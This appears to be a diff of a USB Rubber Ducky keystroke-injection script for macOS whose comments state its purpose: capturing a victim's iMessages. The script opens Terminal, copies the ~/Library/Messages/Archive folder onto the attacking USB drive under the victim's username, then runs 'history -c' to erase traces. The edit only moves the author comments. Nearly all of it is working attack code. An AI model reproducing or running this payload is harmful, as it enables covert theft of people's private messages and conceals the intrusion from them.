@@ -1,12 +1,13 @@
-<pre><code>DELAY 500
+<pre><code>
+REM Author: Alex Jay (Minecracker627) (5A13X99)
+REM This script captures iMessages and puts it into 
+REM a folder named automatically to the victims username
+DELAY 500
 GUI SPACE
 DELAY 150
 STRING Terminal
 ENTER
 DELAY 300
-REM Author: Alex Jay (Minecracker627) (5A13X99)
-REM This script captures iMessages and puts it into 
-REM a folder named automatically to the victims username
 STRING cp -r ~/Library/Messages/Archive /Volumes/RubberDucky/$USER/
 ENTER
 STRING history -c
